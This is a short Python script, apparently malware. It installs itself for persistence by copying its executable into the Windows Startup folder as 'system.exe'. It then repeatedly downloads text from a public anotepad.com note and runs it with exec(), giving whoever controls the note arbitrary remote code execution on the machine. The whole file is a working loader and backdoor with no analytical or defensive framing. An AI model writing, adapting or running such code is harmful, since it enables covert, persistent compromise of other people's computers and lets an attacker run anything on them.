import requests
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
import os
import time
import shutil
import sys
url = "https://anotepad.com/notes/3gkei2dg"

def startup():
    user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    return {"User Startup": user_startup, "Global Startup": global_startup}

def is_program(program_name):
    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    program_path = os.path.join(global_startup, program_name)
    return os.path.exists(program_path)
def copy_file(source_path, destination_folder):
    destination_path = shutil.copy2(source_path, destination_folder + r"\system.exe")
    return destination_path

def inject():
    if is_program("system.exe") == False:
        copy_file(os.path.basename(sys.executable),startup()["User Startup"])

def main():
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    plaintext_content = soup.find(class_="plaintext")
    exec(plaintext_content.text.strip())
    try:
        main()
    except:
        time.sleep(2)
        main()

inject()
time.sleep(1)
main()
